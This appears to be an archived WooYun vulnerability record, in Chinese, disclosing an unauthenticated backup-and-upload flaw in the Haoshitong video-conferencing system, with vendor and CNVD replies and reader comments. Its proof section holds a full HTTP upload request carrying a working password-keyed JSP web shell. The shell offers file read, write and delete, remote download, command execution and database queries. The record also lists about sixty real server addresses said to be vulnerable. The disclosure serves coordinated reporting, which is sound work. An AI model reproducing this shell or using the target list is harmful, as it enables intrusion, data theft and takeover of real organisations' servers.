{"id": 66972, "wybug_id": "wooyun-2015-0132866", "wybug_title": "好视通视频会议系统存在通用型设计缺陷可无限制getshell等操作(无需登录)", "wybug_corp": "深圳市华视瑞通信息技术有限公司", "wybug_author": "YY-2012", "wybug_date": "2015-08-12 18:41", "wybug_open_date": "2015-11-11 18:44", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-11：\t细节向公众公开  简要描述： 附60+案例。 详细说明：  好视通--企业级视频会议系统存在未授权可直接访问\"数据管理\"这功能，从而导致一系列问题产生。1.可直接对数据库进行备份下载等操作。2.利用burp可直接getshell缺陷地址：\n/AdminMgr/backup/databackup.jsp\n   漏洞证明：  1.可直接对数据库进行备份下载等操作。\n\n\n\n\n\n\n\n\n\n2.利用burp可直接getshell\n\n\n\n\nPOST /dbbackup/servlet/backupServlet?action=sc HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://221.7.222.164:8080/dbbackup/adminMgr/fileupload.jspAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: multipart/form-data; boundary=---------------------------7df37e261e0652Accept-Encoding: gzip, deflateHost: 221.7.222.164:8080Content-Length: 6850Pragma: no-cacheCookie: JSESSIONID=BF7A89138A1D74B8D254CCBA0F192340; JSESSIONID=DEE83127DA9F6C044A659ED6293FD46D-----------------------------7df37e261e0652Content-Disposition: form-data; name=\"file\"; filename=\"1.jsp\"Content-Type: image/pjpeg<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%> <%! String Pwd=\"you\";String EC(String s,String c)throws Exception{return s;}Connection GC(String s)throws Exception{String[] x=s.trim().split(\"\\r\\n\");Class.forName(x[0].trim()).newInstance();Connection c=DriverManager.getConnection(x[1].trim());if(x.length>2){c.setCatalog(x[2].trim());}return c;}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i<r.length;i++){sb.append(r[i].toString().substring(0,2));}}void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT, sQ,sF=\"\";java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");for(int i=0;i<l.length;i++){dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?\"R\":\"\";sQ+=l[i].canWrite()?\" W\":\"\";if(l[i].isDirectory()){sb.append(l[i].getName()+\"/\\t\"+sT+\"\\t\"+l[i].length()+\"\\t\"+sQ+\"\\n\");}else{sF+=l[i].getName()+\"\\t\"+sT+\"\\t\"+l[i].length()+\"\\t\"+sQ+\"\\n\";}}sb.append(sF);}void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();for(int k=0;k<x.length;k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write((\"->\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((\"|\"+\"<-\").getBytes(),0,3);os.close();is.close();}void GG(String s, String d)throws Exception{String h=\"0123456789ABCDEF\";int n;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0;i<d.length();i+=2){os.write((h.indexOf(d.charAt(i))<<4|h.indexOf(d.charAt(i+1))));}os.close();}void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();for(int j=0;j<z.length;j++){HH(s+\"/\"+z[j].getName(),d+\"/\"+z[j].getName());}}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s, String d)throws Exception{URL u=new URL(s);int n=0;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}void MM(InputStream is, StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null){sb.append(l+\"\\r\\n\");}}void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=s.indexOf(\"oracle\")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();while(r.next()){sb.append(r.getString(1)+\"\\t\");}r.close();c.close();}void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] t={\"TABLE\"};ResultSet r=c.getMetaData().getTables (null,null,\"%\",t);while(r.next()){sb.append(r.getString(\"TABLE_NAME\")+\"\\t\");}r.close();c.close();}void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split(\"\\r\\n\");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select * from \"+x[3]);ResultSetMetaData d=r.getMetaData();for(int i=1;i<=d.getColumnCount();i++){sb.append(d.getColumnName(i)+\" (\"+d.getColumnTypeName(i)+\")\\t\");}r.close();m.close();c.close();}void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception{Connection c = GC(s);Statement m = c.createStatement(1005, 1008);BufferedWriter bw = null;try {ResultSet r = m.executeQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);ResultSetMetaData d = r.getMetaData();int n = d.getColumnCount();for (int i = 1; i <= n; i++) {sb.append(d.getColumnName(i) + \"\\t|\\t\");}sb.append(\"\\r\\n\");if(q.indexOf(\"--f:\")!=-1){File file = new File(p);file.mkdirs();bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(p +q.substring(q.indexOf(\"--f:\")+4,q.length()).trim()),true),cs));}while (r.next()){for(int i=1;i<=n;i++) {if(q.indexOf(\"--f:\")!=-1){bw.write(EC(r.getString(i), cs)+\"\\t\");bw.flush();}else{sb.append(EC(r.getString(i), cs) + \"\\t|\\t\");}}bw.newLine();sb.append(\"\\r\\n\");}r.close();if(bw!=null){bw.close();}}catch (Exception e){sb.append(\"Result\\t|\\t\\r\\n\");try{m.executeUpdate(q);sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");} catch (Exception ee){sb.append(ee.toString()+\"\\t|\\t\\r\\n\");}}m.close();c.close();} %><% String cs=request.getParameter(\"z0\")+\"\";request.setCharacterEncoding(cs);response.setContentType(\"text/html;charset=\"+cs);String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter(\"z1\")+\"\",cs);String z2=EC(request.getParameter(\"z2\")+\"\",cs);StringBuffer sb=new StringBuffer(\"\");try{sb.append(\"->\"+\"|\");String s = request.getSession().getServletContext().getRealPath(\"/\");if(Z.equals(\"A\")){sb.append(s+\"\\t\");if(!s.substring(0,1).equals(\"/\")){AA(sb);}}else if(Z.equals(\"B\")){BB(z1,sb);}else if(Z.equals(\"C\")){String l=\"\";BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null){sb.append(l+\"\\r\\n\");}br.close();}else if(Z.equals(\"D\")){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.append(\"1\");}else if(Z.equals(\"F\")){FF(z1,response);}else if(Z.equals(\"G\")){GG(z1,z2);sb.append(\"1\");}else if(Z.equals(\"H\")){HH(z1,z2);sb.append(\"1\");}else if(Z.equals(\"I\")){II(z1,z2);sb.append(\"1\");}else if(Z.equals(\"J\")){JJ(z1);sb.append(\"1\");}else if(Z.equals(\"K\")){KK(z1,z2);sb.append(\"1\");}else if(Z.equals(\"L\")){LL(z1,z2);sb.append(\"1\");}else if(Z.equals(\"M\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(\"N\")){NN(z1,sb);}else if(Z.equals(\"O\")){OO(z1,sb);}else if(Z.equals(\"P\")){PP(z1,sb);}else if(Z.equals(\"Q\")){QQ(cs, z1, z2,sb,s.replaceAll(\"\\\\\\\\\",\"/\")+\"/images/\");}}catch(Exception e){sb.append(\"ERROR\"+\":// \"+e.toString());}sb.append(\"|\"+\"<-\");out.print(sb.toString()); %>-----------------------------7df37e261e0652--\n案例：\nhttp://221.7.222.164:8080/AdminMgr/backup/databackup.jsphttp://121.8.160.118:8080/AdminMgr/backup/databackup.jsphttp://119.7.222.250:8080/AdminMgr/backup/databackup.jsphttp://125.92.248.121:8080/AdminMgr/backup/databackup.jsphttp://222.52.66.197:8080/AdminMgr/backup/databackup.jsphttp://121.201.5.201:8080/AdminMgr/backup/databackup.jsphttp://42.228.0.118:8080/AdminMgr/backup/databackup.jsphttp://218.74.116.55:8080/AdminMgr/backup/databackup.jsphttp://60.191.99.164:8080/AdminMgr/backup/databackup.jsphttp://122.228.121.92:8080/AdminMgr/backup/databackup.jsphttp://61.174.61.149:8080/AdminMgr/backup/databackup.jsphttp://222.189.44.82:8080/AdminMgr/backup/databackup.jsphttp://61.132.91.170:8080/AdminMgr/backup/databackup.jsphttp://221.231.139.151:8080/http://222.72.135.116:8080/http://122.144.131.46:8080/http://221.208.198.161:8080/http://60.18.162.249:8080/http://222.223.28.82:8080/http://221.239.37.138:8080/http://218.241.25.2:8080/http://203.187.160.212:8080/http://123.125.203.140:8080/http://211.103.178.66:8080/http://58.134.114.253:8080/http://219.232.254.216:8080/http://119.253.36.79:8080/http://123.178.111.6:8080/http://116.113.111.26:8080/http://221.208.198.58:8080/http://122.228.156.206:8080/http://210.44.16.248:8080/http://220.250.20.42:81/http://116.246.2.93:8080/http://61.153.233.133:8080/http://122.141.182.218:8080/http://211.142.38.30:8080/http://61.163.78.132:8080/http://220.165.15.244:8080/http://121.15.200.113:8080/http://121.199.31.64:8080/http://222.185.140.182:8080/http://125.71.210.56:8080/http://222.187.197.205:8080/http://119.1.151.163:8080/http://113.105.64.228:8080/http://223.4.35.33:8080/http://222.41.213.30:8080/http://222.84.227.45:8080/http://222.35.36.9:8080/http://112.91.64.142:8080/http://124.207.214.230:8080/http://113.105.131.146:8080/http://211.103.167.52:8080/http://116.255.207.210:8080/http://222.173.162.200:8080/http://119.60.0.93:8080/http://106.2.194.211:8080/http://124.119.27.158:8080/http://125.77.194.180:8080/http://121.28.180.247:8080/\n   修复方案：  联系厂商。   版权声明：转载请注明来源 YY-2012@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-08-13 18:43 厂商回复： CNVD确认所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-10 18:43 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:567 漏洞数:108        | 低调求发展)\t\t \n  你什么时候才能转核心。。。    \n     2015-08-11 00:08 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1284 漏洞数:326        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  你什么时候才能转核心。。。    \n     2015-08-11 02:06 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  你之前好像是蓝V来着，怎么掉了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}